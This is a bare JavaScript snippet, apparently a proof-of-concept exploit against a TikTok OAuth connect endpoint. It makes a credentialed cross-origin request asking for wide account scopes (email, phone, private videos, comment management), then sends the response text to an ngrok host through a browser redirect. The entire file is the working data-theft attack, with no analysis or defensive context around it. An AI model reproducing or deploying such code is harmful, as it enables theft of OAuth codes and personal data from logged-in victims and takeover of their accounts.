var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://open-api.tiktok.com/platform/oauth/connect?client_key=aw8cb3204x0a1g88&response_type=code&scope=bizpartner.user.info,bizpartner.item.info,biz.account.info,biz.account.phone,biz.account.email,user.info.basic,user.info.email,user.info.phone,user.info.showcase,video.list.no_watermark,video.list.private_ads.no_watermark,user.account.configure,video.list.manage,live.list,comment.list,comment.list.manage&optional_scope=&version=1&lang=en&state=9879837854338c6c09c3f4526ecd213e412b078d&redirect_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Ftransit%3F_extra%3DcGxhdGZvcm09dGlrdG9rJmxvZ2luX2FjdGlvbj1iaW5kJmZyb21fcGFnZT0mc2hvd19iaW5kX2Vycm9yPXRydWUmc2hvd19sb2dvdXQ9dHJ1ZSZhYWR2aWQ9JnZlcmlmeV90aWNrZXQ9VlRJU0dPVjJKSzJDUEFVNUFHV0M2RzhQTTVRM0NWQVlWWkI0WjImdmVyaWZ5X3BhZ2U9dXNlci1zZXR0aW5n&error_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Ftransit%3F_extra%3DcGxhdGZvcm09dGlrdG9rJmxvZ2luX2FjdGlvbj1iaW5kJmZyb21fcGFnZT0mc2hvd19iaW5kX2Vycm9yPXRydWUmc2hvd19sb2dvdXQ9dHJ1ZSZhYWR2aWQ9JnZlcmlmeV90aWNrZXQ9VlRJU0dPVjJKSzJDUEFVNUFHV0M2RzhQTTVRM0NWQVlWWkI0WjImdmVyaWZ5X3BhZ2U9dXNlci1zZXR0aW5n");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
};
